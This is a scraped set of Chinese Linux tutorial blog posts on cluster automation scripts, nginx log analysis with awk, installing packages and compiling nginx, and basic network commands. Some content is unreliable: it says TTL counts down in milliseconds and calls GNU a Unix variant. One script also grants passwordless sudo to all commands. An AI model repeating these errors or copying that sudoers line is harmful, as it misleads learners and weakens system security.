把地址打印到屏幕上。 如果用 shell 执行上面的程序会报错，因为 readarray 是 bash 4.0 后支持的能力，因此我们用 chomd 为 foreach.sh 增加执行权限，然后直接利用 shebang 的能力用 bash 执行，如下图所示： 第三步：创建集群管理账户为了方便集群管理，通常使用统一的用户名管理集群。这个账号在所有的集群中都需要保持命名一致。比如这个集群账号的名字就叫作 lagou。 接下来我们探索一下如何创建这个账户 lagou，如下图所示： 上面我们创建了 lagou 账号，然后把 lagou 加入 sudo 分组。这样 lagou 就有了 sudo 成为 root 的能力，如下图所示： 接下来，我们设置 lagou 用户的初始化 shell 是 bash，如下图所示： 这个时候如果使用命令 su lagou，可以切换到 lagou 账号，但是你会发现命令行没有了颜色。因此我们可以将原来用户下面的.bashrc 文件拷贝到/home/lagou 目录下，如下图所示： 这样，我们就把一些自己平时用的设置拷贝了过去，包括终端颜色的设置。.bashrc 是启动 bash 的时候会默认执行的一个脚本文件。 接下来，我们编辑一下/etc/sudoers 文件，增加一行 lagou ALL=(ALL) NOPASSWD:ALL 表示 lagou 账号 sudo 我们可以把上面的完整过程整理成指令文件，create_lagou.sh： 1234567sudo useradd -m -d /home/lagou lagousudo passwd lagousudo usermod -G sudo lagousudo usermod --shell /bin/bash lagousudo cp ~/.bashrc /home/lagou/sudo chown lagou.lagou /home/lagou/.bashrcsudo sh -c &#x27;echo &quot;lagou ALL=(ALL) NOPASSWD:ALL&quot;&gt;&gt;/etc/sudoers&#x27; 你可以删除用户 lagou，并清理/etc/sudoers 文件最后一行。用指令 userdel lagou 删除账户，然后执行 create_lagou.sh 重新创建回 lagou 账户。如果发现结果一致，就代表 create_lagou.sh 功能没有问题。 最后我们想在 v1``v2 上都执行 create_logou.sh 这个脚本。但是你不要忘记，我们的目标是让程序在成百上千台机器上传播，因此还需要一个脚本将 create_lagou.sh 拷贝到需要执行的机器上去。 这里，可以对 foreach.sh 稍做修改，然后分发 create_lagou.sh 文件。 foreach.sh 1234567#!/usr/bin/bashreadarray -t ips &lt; iplistfor ip in $&#123;ips[@]&#125;do scp ~/remote/create_lagou.sh ramroll@$ip:~/create_lagou.shdone 这里，我们在循环中用 scp 进行文件拷贝，然后分别去每台机器上执行 create_lagou.sh。 如果你的机器非常多，上述过程会变得非常烦琐。你可以先带着这个问题学习下面的 Step 4，然后再返回来重新思考这个问题，当然你也可以远程执行脚本。另外，还有一个叫作 sshpass 的工具，可以帮你把密码传递给要远程执行的指令，如果你对这块内容感兴趣，可以自己研究下这个工具。 第四步： 打通集群权限接下来我们需要打通从主服务器到 v1 和 v2 的权限。当然也可以每次都用 ssh 输入用户名密码的方式登录，但这并不是长久之计。 如果我们有成百上千台服务器，输入用户名密码就成为一件繁重的工作。 这时候，你可以考虑利用主服务器的公钥在各个服务器间登录，避免输入密码。接下来我们聊聊具体的操作步骤： 首先，需要在 u1 上用 ssh-keygen 生成一个公私钥对，然后把公钥写入需要管理的每一台机器的 authorized_keys 文件中。如下图所示：我们使用 ssh-keygen 在主服务器 u1 中生成公私钥对。 然后使用 mkdir -p 创建/.ssh 目录，-p 的优势是当目录不存在时，才需要创建，且不会报错。代表当前家目录。 如果文件和目录名前面带有一个.，就代表该文件或目录是一个需要隐藏的文件。平时用 ls 的时候，并不会查看到该文件，通常这种文件拥有特别的含义，比如~/.ssh 目录下是对 ssh 的配置。 我们用 cd 切换到.ssh 目录，然后执行 ssh-keygen。这样会在~/.ssh 目录中生成两个文件，id_rsa.pub 公钥文件和 is_rsa 私钥文件。 如下图所示： 可以看到 id_rsa.pub 文件中是加密的字符串，我们可以把这些字符串拷贝到其他机器对应用户的~/.ssh/authorized_keys 文件中，当 ssh 登录其他机器的时候，就不用重新输入密码了。 这个传播公钥的能力，可以用一个 shell 脚本执行，这里我用 transfer_key.sh 实现。 我们修改一下 foreach.sh，并写一个 transfer_key.sh 配合 foreach.sh 的工作。transfer_key.sh 内容如下： foreach.sh 123456#!/usr/bin/bashreadarray -t ips &lt; iplistfor ip in $&#123;ips[@]&#125;do sh ./transfer_key.sh $ipdone transfer_key.sh 123456789ip=$1pubkey=$(cat ~/.ssh/id_rsa.pub)echo &quot;execute on .. $ip&quot;ssh lagou@$ip &quot; mkdir -p ~/.sshecho $pubkey &gt;&gt; ~/.ssh/authorized_keyschmod 700 ~/.sshchmod 600 ~/.ssh/authorized_keys&quot; 在 foreach.sh 中我们执行 transfer_key.sh，并且将 IP 地址通过参数传递过去。在 transfer_key.sh 中，用$1 读出 IP 地址参数， 再将公钥写入变量 pubkey，然后登录到对应的服务器，执行多行指令。用 mkdir 指令检查.ssh 目录，如不存在就创建这个目录。最后我们将公钥追加写入目标机器的~/.ssh/authorized_keys 中。 chmod 700 和 chmod 600 是因为某些特定的 linux 版本需要.ssh 的目录为可读写执行，authorized_keys 文件的权限为只可读写。而为了保证安全性，组用户、所有用户都不可以访问这个文件。 此前，我们执行 foreach.sh 需要输入两次密码。完成上述操作后，我们再登录这两台服务器就不需要输入密码了。 第五步：单机安装 Java 环境在远程部署 Java 环境之前，我们先单机完成以下 Java 环境的安装，用来收集需要执行的脚本。 在 ubuntu 上安装 java 环境可以直接用 apt。 我们通过下面几个步骤脚本配置 Java 环境： 1sudo apt install openjdk-11-jdk 经过一番等待我们已经安装好了 java，然后执行下面的脚本确认 java 安装。 12which javajava --version 根据最小权限原则，执行 Java 程序我们考虑再创建一个用户 ujava。 12sudo useradd -m -d /opt/ujava ujavasudo usermod --shell /bin/bash lagou 这个用户可以不设置密码，因为我们不会真的登录到这个用户下去做任何事情。接下来我们为用户配置 Java 环境变量，如下图所示： 通过两次 ls 追查，可以发现 java 可执行文件软连接到 /etc/alternatives/java 然后再次软连接到 /usr/lib/jvm/java-11-openjdk-amd64 下。 这样我们就可以通过下面的语句设置 JAVA_HOME 环境变量了。 1export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64/ Linux 的环境变量就好比全局可见的数据，这里我们使用 export 设置 JAVA_HOME 环境变量的指向。如果你想看所有的环境变量的指向，可以使用 env 指令。 其中有一个环境变量比较重要，就是 PATH。 如上图，我们可以使用 shell 查看 PATH 的值，PATH 中用:分割，每一个目录都是 linux 查找执行文件的目录。当用户在命令行输入一个命令，Linux 就会在 PATH 中寻找对应的执行文件。 当然我们不希望 JAVA_HOME 配置后重启一次电脑就消失，因此可以把这个环境变量加入 ujava 用户的 profile 中。这样只要发生用户登录，就有这个环境变量。 1sudo sh -c &#x27;echo &quot;export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64/&quot; &gt;&gt; /opt/ujava/.bash_profile&#x27; 将 JAVA_HOME 加入 bash_profile，这样后续远程执行 java 指令时就可以使用 JAVA_HOME 环境变量了。 最后，我们将上面所有的指令整理起来，形成一个 install_java.sh。 1234sudo apt -y install openjdk-11-jdksudo useradd -m -d /opt/ujava ujavasudo usermod --shell /bin/bash ujavasudo sh -c &#x27;echo &quot;export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64/&quot; &gt;&gt; /opt/ujava/.bash_profile&#x27; apt 后面增了一个-y 是为了让执行过程不弹出确认提示。 第六步：远程安装 Java 环境终于到了远程安装 Java 环境这一步，我们又需要用到 foreach.sh。为了避免每次修改，你可以考虑允许 foreach.sh 带一个文件参数，指定需要远程执行的脚本。 foreach.sh 12345678#!/usr/bin/bashreadarray -t ips &lt; iplistscript=$1for ip in $&#123;ips[@]&#125;do ssh $ip &#x27;bash -s&#x27; &lt; $scriptdone 改写后的 foreach 会读取第一个执行参数作为远程执行的脚本文件。 而 bash -s 会提示使用标准输入流作为命令的输入；&lt; $script 负责将脚本文件内容重定向到远程 bash 的标准输入流。 然后我们执行 foreach.sh install_java.sh，机器等待 1 分钟左右，在执行结束后，可以用下面这个脚本检测两个机器中的安装情况。 check.sh 12sudo -u ujava -i /bin/bash -c &#x27;echo $JAVA_HOME&#x27;sudo -u ujava -i java --version check.sh 中我们切换到 ujava 用户去检查 JAVA_HOME 环境变量和 Java 版本。 总结这节课我们所讲的场景是自动化运维的一些皮毛。通过这样的场景练习，我们复习了很多之前学过的 Linux 指令。在尝试用脚本文件构建一个又一个小工具的过程中，可以发现复用很重要。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"日志分析","slug":"计操/日志分析","date":"2021-07-18T13:57:18.000Z","updated":"2021-07-18T06:26:36.162Z","comments":true,"path":"2021/07/18/计操/日志分析/","link":"","permalink":"https://www.shanghua.live/2021/07/18/%E8%AE%A1%E6%93%8D/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","excerpt":"","text":"著名的黑客、自由软件运动的先驱理查德.斯托曼说过，“编程不是科学，编程是手艺”。可见，要想真正搞好编程，除了学习理论知识，还需要在实际的工作场景中进行反复的锤炼。 本课时将用到一个大概有 5W 多条记录的 nginx 日志文件，你可以在 GitHub https://github.com/ramroll/lagou-os/blob/main/access.log 上下载。 下面就请你和我一起，通过分析这个 nginx 日志文件，去锤炼我们的手艺。 第一步：能不能这样做？当我们想要分析一个线上文件的时候，首先要思考，能不能这样做？ 这里你可以先用 htop 指令看一下当前的负载。如果你的机器上没有 htop，可以考虑用 yum 或者 apt 去安装。 如上图所示，我的机器上 4 个 CPU 负载都不大，12G 的内存用了一半多，还有富余。 我们用 wget 将目标文件下载到本地（如果你没有 wget，可以用 yum 或者 apt 安装）。 1wget https://raw.githubusercontent.com/shanghua521/lagou-os/main/access.log 然后我们用 ls 查看文件大小。发现这只是一个 7M 的文件，因此对线上的影响可以忽略不计。如果文件太大，建议你用 scp 指令将文件拷贝到闲置服务器再分析。下图中我使用了–block-size 让 ls 以 M 为单位显示文件大小。 第二步：LESS 日志文件在分析日志前，给你提个醒，记得要 less 一下，看看日志里面的内容。之前我们说过，尽量使用 less 这种不需要读取全部文件的指令，因为在线上执行 cat 是一件非常危险的事情，这可能导致线上服务器资源不足。 如上图所示，我们看到 nginx 的 access_log 每一行都是一次用户的访问，从左到右依次是： IP 地址； 时间； HTTP 请求的方法、路径和协议版本、返回的状态码； User Agent。 第三步：PV 分析PV（Page View），用户每访问一个页面就是一次 Page View。对于 nginx 的 access_log 来说，分析 PV 非常简单，我们直接使用 wc -l 就可以看到整体的 PV。 如上图所示：我们看到了一共有 51462 条 PV。 第四步：PV 分组通常一个日志中可能有几天的 PV，为了得到更加直观的数据，有时候需要按天进行分组。为了简化这个问题，我们先来看看日志中都有哪些天的日志。 使用 awk &#39;&#123;print $4&#125;&#39; access.log | less 可以看到如下结果。awk 是一个处理文本的领域专有语言。这里就牵扯到领域专有语言这个概念，英文是 Domain Specific Language。领域专有语言，就是为了处理某个领域专门设计的语言。比如 awk 是用来分析处理文本的 DSL，html 是专门用来描述网页的 DSL，SQL 是专门用来查询数据的 DSL……大家还可以根据自己的业务设计某种针对业务的 DSL。 你可以看到我们用$4 代表文本的第 4 列，也就是时间所在的这一列，如下图所示： 我们想要按天统计，可以利用 awk 提供的字符串截取的能力awk &#39;&#123;print substr($4,2,11)&#125;&#39; access.log | less 上图中，我们使用 awk 的 substr 函数，数字 2 代表从第 2 个字符开始，数字 11 代表截取 11 个字符。 接下来我们就可以分组统计每天的日志条数了 awk &#39;&#123;print substr($4,2,11)&#125;&#39; access.log | sort | uniq -c 上图中，使用 sort 进行排序，然后使用 uniq -c 进行统计。你可以看到从 2015 年 5 月 17 号一直到 6 月 4 号的日志，还可以看到每天的 PV 量大概是在 2000~3000 之间。 第五步：分析 UV接下来我们分析 UV。UV（Uniq Visitor），也就是统计访问人数。通常确定用户的身份是一个复杂的事情，但是我们可以用 IP 访问来近似统计 UV。 上图中，我们使用 awk 去打印$1 也就是第一列，接着 sort 排序，然后用 uniq 去重，最后用 wc -l 查看条数。 这样我们就知道日志文件中一共有 2660 个 IP，也就是 2660 个 UV。 第六步：分组分析 UV接下来我们尝试按天分组分析每天的 UV 情况。这个情况比较复杂，需要较多的指令，我们先创建一个叫作 sum.sh 的 bash 脚本文件，写入如下内容： 1234#!/usr/bin/bashawk &#x27;&#123;print substr($4, 2, 11) &quot; &quot; $1&#125;&#x27; access.log |\\ sort | uniq |\\ awk &#x27;&#123;uv[$1]++;next&#125;END&#123;for (ip in uv) print ip, uv[ip]&#125;&#x27; 具体分析如下。 文件首部我们使用#!，表示我们将使用后面的/usr/bin/bash 执行这个文件。 第一次 awk 我们将第 4 列的日期和第 1 列的 ip 地址拼接在一起。 下面的 sort 是把整个文件进行一次字典序排序，相当于先根据日期排序，再根据 IP 排序。 接下来我们用 uniq 去重，日期 +IP 相同的行就只保留一个。 最后的 awk 我们再根据第 1 列的时间和第 2 列的 IP 进行统计。 为了理解最后这一行描述，我们先来简单了解下 awk 的原理。 awk 本身是逐行进行处理的。因此我们的 next 关键字是提醒 awk 跳转到下一行输入。 对每一行输入，awk 会根据第 1 列的字符串（也就是日期）进行累加。之后的 END 关键字代表一个触发器，就是 END 后面用 {} 括起来的语句会在所有输入都处理完之后执行——当所有输入都执行完，结果被累加到 uv 中后，通过 foreach 遍历 uv 中所有的 key，去打印 ip 和 ip 对应的数量。 编写完上面的脚本之后，我们保存退出编辑器。接着执行 chmod +x ./sum.sh，给 sum.sh 增加执行权限。然后我们可以像下图这样执行，获得结果： 如上图，IP 地址已经按天进行统计好了。 总结今天我们结合一个简单的实战场景——Web 日志分析与统计练习了之前学过的指令，提高熟练程度。此外，我们还一起学习了新知识——功能强大的 awk 文本处理语言。在实战中，我们对一个 nginx 的 access_log 进行了简单的数据分析，直观地获得了这个网站的访问情况。 我们在日常的工作中会遇到各种各样的日志，除了 nginx 的日志，还有应用日志、前端日志、监控日志等等。你都可以利用今天学习的方法，去做数据分析，然后从中得出结论。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"软件的安装","slug":"计操/软件的安装","date":"2021-07-18T11:42:15.000Z","updated":"2021-07-18T04:32:46.220Z","comments":true,"path":"2021/07/18/计操/软件的安装/","link":"","permalink":"https://www.shanghua.live/2021/07/18/%E8%AE%A1%E6%93%8D/%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85/","excerpt":"","text":"在 Linux 上安装程序大概有 2 种思路： 直接编译源代码； 使用包管理器。 包管理器使用Linux 下的应用程序多数以软件包的形式发布，用户拿到对应的包之后，使用包管理器进行安装。说到包管理器，就要提到 dpkg 和 rpm。 我们先说说包。 Linux 下两大主流的包就是 rpm 和 dpkg。 dpkg（debian package），是 linux 一个主流的社区分支开发出来的。社区就是开源社区，有很多世界顶级的程序员会在社区贡献代码，比如 github。一般衍生于 debian 的 Linux 版本都支持 dpkg，比如 ubuntu。 rpm（redhatpackage manager）。在正式讲解之前，我们先来聊聊 RedHat 这家公司。 RedHat 是一个做 Linux 的公司，你可以把它理解成一家“保险公司”。 很多公司购买红帽的服务，是为了给自己的业务上一个保险。以防万一哪天公司内部搞不定 Linux 底层，或者底层有 Bug，再或者底层不适合当下的业务发展，需要修改等问题，红帽的工程师都可以帮企业解决。 再比如，RedHat 收购了 JBoss，把 JBoss 改名为 WildFly。 像 WildFly 这种工具更多是面向企业级，比如没有大量研发团队的企业会更倾向使用成熟的技术。RedHat 公司也有自己的 Linux，就叫作 RedHat。RedHat 系比较重要的 Linux 有 RedHat/Fedora 等。 无论是 dpkg 还是 rpm 都抽象了自己的包格式，就是以.dpkg 或者.rpm 结尾的文件。 dpkg 和 rpm 也都提供了类似的能力： 查询是否已经安装了某个软件包； 查询目前安装了什么软件包； 给定一个软件包，进行安装； 删除一个安装好的软件包。 关于 dpkg 和 rpm 的具体用法，你可以用 man 进行学习。接下来我们聊聊 yum 和 apt。 自动依赖管理Linux 是一个开源生态，因此工具非常多。工具在给用户使用之前，需要先打成 dpkg 或者 rpm 包。 有的时候一个包会依赖很多其他的包，而 dpkg 和 rpm 不会对这种情况进行管理，有时候为了装一个包需要先装十几个依赖的包，过程非常艰辛！因此现在多数情况都在用 yum 和 apt。 yum你可能会说，我不用 yum 也不用 apt，我只用 docker。首先给你一个连击 666，然后我还是要告诉你，如果你做 docker 镜像，那么还是要用到 yum 和 apt，因此还是有必要学一下。 yum 的全名是 Yellodog Updator，Modified。 看名字就知道它是基于 Yellodog Updator 这款软件修改而来的一个工具。yum 是 Python 开发的，提供的是 rpm 包，因此只有 redhat 系的 Linux，比如 Fedora，Centos 支持 yum。yum 的主要能力就是帮你解决下载和依赖两个问题。 下载之所以是问题，是因为 Linux 生态非常庞大，有时候用户不知道该去哪里下载一款工具。比如用户想安装 vim，只需要输入 sudo yum install vim 就可以安装了。yum 的服务器收集了很多 linux 软件，因此 yum 会帮助用户找到 vim 的包。 另一方面，yum 帮助用户解决了很多依赖，比如用户安装一个软件依赖了 10 个其他的软件，yum 会把这 11 个软件一次性的装好。 关于 yum 的具体用法，你可以使用 man 工具进行学习。 apt接下来我们来重点说说 apt，然后再一起尝试使用。因 apt 全名是 Advanced Packaging Tools，是一个 debian 及其衍生 Linux 系统下的包管理器。由于 advanced（先进）是相对于 dpkg 而言的，因此它也能够提供和 yum 类似的下载和依赖管理能力。比如在没有 vim 的机器上，我们可以用下面的指令安装 vim。如下图所示： 然后用 dpkg 指令查看 vim 的状态是 ii。第一个 i 代表期望状态是已安装，第二个 i 代表实际状态是已安装。 下面我们卸载 vim，再通过 dpkg 查看，如下图所示： 我们看到 vim 的状态从 ii 变成了 rc，r 是期望删除，c 是实际上还有配置文件遗留。 如果我们想彻底删除配置文件，可以使用 apt purge，就是彻底清除的意思，如下图所示： 再使用 dpkg -l 时，vim 已经清除了。 期待结果是 u 就是 unkonw（未知）说明已经没有了。实际结果是 n，就是 not-installed（未安装）。 如果想查询 mysql 相关的包，可以使用 apt serach mysql，这样会看到很多和 mysql 相关的包，如下图所示： 如果我们想精确查找一个叫作 mysql-server 的包，可以用 apt list。 这里我们找到了 mysql-server 包。 另外有时候国内的 apt 服务器速度比较慢，你可以尝试使用阿里云的镜像服务器。具体可参考我下面的操作： 1234567891011121314cat /etc/apt/sources.list--以下是文件内容--deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse 镜像地址可以通过/etc/apt/sources.list 配置，注意 focal 是我用的 ubuntu 版本，你可以使用 sudo lsb_release 查看自己的 Ubuntu 版本。如果你想用我上面给出的内容覆盖你的 sources.list，只需把版本号改成你自己的。注意，每个 ubuntu 版本都有自己的代号。 。如果你是 centos 或者 fedora，需要自己 man 一下 yum。 编译安装 Nginx接下来我们说说编译安装 Nginx（发音是 engine X），是一个家喻户晓的 Web 服务器。 它的发明者是俄国的伊戈尔·赛索耶夫。赛索耶夫 2002 年开始写 Nginx，主要目的是解决同一个互联网节点同时进入大量并发请求的问题。注意，大量并发请求不是大量 QPS 的意思，QPS 是吞吐量大，需要快速响应，而高并发时则需要合理安排任务调度。 后来塞索耶夫成立了 Nginx 公司， 2018 年估值到达到 4.3 亿美金。现在基本上国内大厂的 Web 服务器都是基于 Nginx，只不过进行了特殊的修改，比如淘宝用 Tengine。 下面我们再来看看源码安装，在 Linux 上获取 nginx 源码，可以去搜索 Nginx 官方网站，一般都会提供源码包。 如上图所示，可以看到 nginx-1.20.1 的网址是：http://nginx.org/download/nginx-1.20.1.tar.gz。然后我们用 wget 去下载这个包。 wget 是 GNU 项目下的下载工具，GNU 是早期 unix 项目的一个变种。linux 下很多工具都是从 unix 继承来的，这就是开源的好处，很多工具不用再次开发了。你可能很难想象 windows 下的命令工具可以在 linux 下用，但是 linux 下的工具却可以在任何系统中用。 因此，linux 下面的工具发展速度很快，如今已成为最受欢迎的服务器操作系统。 当然也有同学的机器上没有 wget，那么你可以用 apt 安装一下。 第一步：下载源码。我们使用 wget 下载 nginx 源码包： 第二步：解压。我们解压下载好的 nginx 源码包。 tar 是用来打包和解压用的。之所以叫作 tar 是有一些历史原因：t 代表 tape（磁带）；ar 是 archive（档案）。因为早期的存储介质很小，人们习惯把文件打包然后存储到磁带上，那时候 unix 用的命令就是 tar。因为 linux 是个开源生态，所以就沿袭下来继续使用 tar。 -x 代表 extract（提取）。-z 代表 gzip，也就是解压 gz 类型的文件。-v 代表 verbose（显示细节），如果你不输入-v，就不会打印解压过程了。-f 代表 file，这里指的是要操作文件，而不是磁带。 所以 tar 解压通常带有 x 和 f，打包通常是 c 就是 create 的意思。 第三步：配置和解决依赖。解压完，我们进入 nginx 的目录看一看。 如下图所示： 可以看到一个叫作 configure 的文件是绿色的，也就是可执行文件。然后我们执行 configure 文件进行配置，这个配置文件来自一款叫作 autoconf （配置检查） 的工具，也是 GNU 项目下的，说白了就是 bash（Bourne Shell）下的安装打包工具（就是个安装程序）。这个安装程序支持很多配置，你可以用./configure –help 看到所有的配置项，如下图所示： 这里有几个非常重要的配置项，叫作 prefix。prefix 配置项决定了软件的安装目录。如果不配置这个配置项，就会使用默认的安装目录。sbin-path 决定了 nginx 的可执行文件的位置。conf-path 决定了 nginx 配置文件的位置。我们都使用默认，然后执行./configure，如下图所示： 如果报错了请检查是否有相关如 gcc perl zlib 依赖的工具，如果可以使用 apt 进行安装，安装好再执行 .configure 第四步：编译和安装。 通常配置完之后，我们输入 make &amp;&amp; sudo make install 进行编译和安装。make 是 linux 下面一个强大的构建工具。autoconf 也就是./configure 会在当前目录下生成一个 MakeFile 文件。make 会根据 MakeFile 文件编译整个项目。编译完成后，能够形成和当前操作系统以及 CPU 指令集兼容的二进制可执行文件。然后再用 make install 安装。&amp;&amp;符号代表执行完 make 再去执行 make install。 你可以看到编译是个非常慢的活。等待了差不多 1 分钟，终于结束了。nginx 被安装到了/usr/local/nginx 中，如果需要让 nginx 全局执行，可以设置一个软连接到/usr/local/bin，具体如下： 1ln -sf /usr/local/nginx/sbin/nginx /usr/local/sbin/nginx 为什么会有编译安装？学完整个编译安装 Ngnix 过程后，你可能会问，为什么会有编译安装这么复杂的事情。 原来使用 C/C++ 写的程序存在一个交叉编译的问题。就是写一次程序，在很多个平台执行。而不同指令集的 CPU 指令，还有操作系统的可执行文件格式是不同的。因此，这里有非常多的现实问题需要解决。一般是由操作系统的提供方，比如 RedHat 来牵头解决这些问题。你可以用 apt 等工具提供给用户已经编译好的包。apt 会自动根据用户的平台类型选择不同的包。 但如果某个包没有在平台侧注册，也没有提供某个 Linux 平台的软件包，我们就需要回退到编译安装，通过源代码直接在某个平台安装。 总结我们学习了在 Linux 上安装软件，简要介绍了 dpkg 和 rpm，然后介绍了能够解决依赖和帮助用户下载的 yum 和 apt。重点带你使用了 apt，在这个过程中看到了强大的包管理机制，今天的 maven、npm、pip 都继承了这样一个特性。最后我们还尝试了一件高难度的事情，就是编译安装 nginx。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"Linux 网络指令","slug":"计操/Linux网络指令","date":"2021-07-17T18:08:54.000Z","updated":"2021-07-18T03:40:34.319Z","comments":true,"path":"2021/07/18/计操/Linux网络指令/","link":"","permalink":"https://www.shanghua.live/2021/07/18/%E8%AE%A1%E6%93%8D/Linux%E7%BD%91%E7%BB%9C%E6%8C%87%E4%BB%A4/","excerpt":"","text":"Linux 中提供了不少网络相关的指令，因为网络指令比较分散 远程操作； 查看本地网络状态； 网络测试； DNS 查询； HTTP。 这块知识从体系上属于 Linux 指令，同时也关联了很多计算机网络的知识，比如说 TCP/IP 协议、UDP 协议 远程操作指令远程操作指令用得最多的是 ssh，ssh 指令允许远程登录到目标计算机并进行远程操作和管理。还有一个比较常用的远程指令是 scp，scp 帮助我们远程传送文件。 ssh（Secure Shell）有一种场景需要远程登录一个 Linux 系统，这时我们会用到 ssh 指令。比如你想远程登录一台机器，可以使用 ssh user@ip 的方式，如下图所示： scp另一种场景是我需要拷贝一个文件到远程，这时可以使用 scp 指令，如下图，我使用 scp 指令将本地计算机的一个文件拷贝到了 ubuntu 虚拟机用户的家目录中。 比如从 u1 拷贝家目录下的文件 a.txt 到 u2。家目录有一个简写，就是用~。具体指令见下图： 输入 scp 指令之后会弹出一个提示，要求输入密码，系统验证通过后文件会被成功拷贝。这里我只是通过 scp 拷贝到当前电脑的当前目录了，如果连接的是其他主机就会拷贝到其他主机里 查看本地网络状态如果你想要了解本地的网络状态，比较常用的网络指令是 ifconfig 和 netstat。 ifconfig当你想知道本地 ip 以及本地有哪些网络接口时，就可以使用 ifconfig 指令。你可以把一个网络接口理解成一个网卡，有时候虚拟机会装虚拟网卡，虚拟网卡是用软件模拟的网卡。 比如：VMware 为每个虚拟机创造一个虚拟网卡，通过虚拟网卡接入虚拟网络。当然物理机也可以接入虚拟网络，它可以通过虚拟网络向虚拟机的虚拟网卡上发送信息。 下图是我的 ubuntu 虚拟机用 ifconfig 查看网络接口信息。 可以看到我的这台 ubuntu 虚拟机一共有 2 个网卡，ens33 和 lo。lo 是本地回路（local loopback），发送给 lo 就相当于发送给本机。ens33 是一块连接着真实网络的虚拟网卡。 netstat另一个查看网络状态的场景是想看目前本机的网络使用情况，这个时候可以用 netstat。 不传任何参数的 netstat 帮助查询所有的本地 socket，下图是 netstat | less 的结果。 如上图，我们看到的是 socket 文件。socket 是网络插槽被抽象成了文件，负责在客户端、服务器之间收发数据。当客户端和服务端发生连接时，客户端和服务端会同时各自生成一个 socket 文件，用于管理这个连接。这里，可以用 wc -l 数一下有多少个 socket。 你可以看到一共有 1412 个 socket 文件，因为有很多 socket 在解决进程间的通信。就是将两个进程一个想象成客户端，一个想象成服务端。并不是真的有 600 多个连接着互联网的请求。 查看 TCP 连接如果想看有哪些 TCP 连接，可以使用 netstat -t。比如下面我通过 netstat -t 看 tcp 协议的网络情况： 查看端口占用还有一种非常常见的情形，我们想知道某个端口是哪个应用在占用。如下图所示： 这里我们看到 22 端口被 sshd，也就是远程登录模块被占用了。-n 是将一些特殊的端口号用数字显示，-t 是指看 TCP 协议，-l 是只显示连接中的连接，-p 是显示程序名称。 网络测试当我们需要测试网络延迟、测试服务是否可用时，可能会用到 ping 和 telnet 指令。 ping想知道本机到某个网站的网络延迟，就可以使用 ping 指令。如下图所示： ping 一个网站需要使用 ICMP 协议。因此你可以在上图中看到 icmp 序号。 这里的时间 time 是往返一次的时间。ttl 叫作 time to live，是封包的生存时间。就是说，一个封包从发出就开始倒计时，如果途中超过 128ms，这个包就会被丢弃。如果包被丢弃，就会被算进丢包率。 另外 ping 还可以帮助我们看到一个网址的 IP 地址。 通过网址获得 IP 地址的过程叫作 DNS Lookup（DNS 查询）。ping 利用了 DNS 查询，但是没有显示全部的 DNS 查询结果。 telnet有时候我们想知道本机到某个 IP + 端口的网络是否通畅，也就是想知道对方服务器是否在这个端口上提供了服务。这个时候可以用 telnet 指令。 如下图所示： telnet 执行后会进入一个交互式的界面，比如这个时候，我们输入下图中的文字就可以发送 HTTP 请求了。 如上图所示，第 5 行的 GET 和第 6 行的 HOST 是我输入的。 B 站返回了一个 301 永久跳转。这是因为拉勾网尝试把 http 协议链接重定向到 https。 DNS 查询我们排查网络故障时想要进行一次 DNS Lookup，想知道一个网址 DNS 的解析过程。这个时候有多个指令可以用。 hosthost 就是一个 DNS 查询工具。比如我们查询拉勾网的 DNS，如下图所示： 我们看到 b 站 www.bilibili.com 是一个别名，它的原名是 a 开头的一个域名，这说明 b 站有可能在用 CDN 分发主页 上图中，可以找到 7 个域名对应的 IP 地址。 如果想追查某种类型的记录，可以使用 host -t。比如下图我们追查 B 站的 AAAA 记录，因为拉勾网还没有部署 IPv6，所以没有找到。 digdig 指令也是一个做 DNS 查询的。不过 dig 指令显示的内容更详细。下图是 dig B 站的结果。 从结果可以看到www.bilibili.com 有一个别名，用 CNAME 记录定义 a 开头的一个域名，然后有 7 条 A 记录，通常这种情况是为了均衡负载或者分发内容。 HTTP 相关最后我们来说说 http 协议相关的指令。 curl如果要在命令行请求一个网页，或者请求一个接口，可以用 curl 指令。curl 支持很多种协议，比如 LDAP、SMTP、FTP、HTTP 等。 我们可以直接使用 curl 请求一个网址，获取资源，比如我用 curl 直接获取了百度的主页，如下图所示： 另外 curl 还可以执行 POST 请求，比如下面这个语句： 1curl -d &#x27;&#123;&quot;x&quot; : 1&#125;&#x27; -H &quot;Content-Type: application/json&quot; -X POST http://localhost:3000/api curl 在向 localhost:3000 发送 POST 请求。-d 后面跟着要发送的数据， -X 后面是用到的 HTTP 方法，-H 是指定自定义的请求头。 总结我们学了各种各样的命令，希望你每个都练习一下","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"Linux 